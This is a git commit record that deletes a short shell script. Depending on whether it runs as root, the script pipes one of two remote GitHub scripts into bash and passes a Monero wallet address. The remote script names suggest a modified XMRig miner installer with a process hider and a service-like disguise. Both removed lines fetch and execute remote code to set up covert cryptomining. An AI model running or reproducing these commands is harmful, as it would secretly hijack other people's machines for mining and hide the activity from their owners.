79430b97eb6efe0a765dfa790a5dde36586dabd1
littlAcen <113854209+littlAcen@users.noreply.github.com>
2023-11-30 22:06:27 +0100

    Delete setup_user_or_root_install.sh

--- setup_user_or_root_install.sh
+++
@@ -1,5 +0,0 @@
-if [ $EUID -ne 0 ]; then
-    curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_swapd_processhider_OLD2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX littlAcen@24-mail.com
-    else
-    curl  -s -L https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
-fi
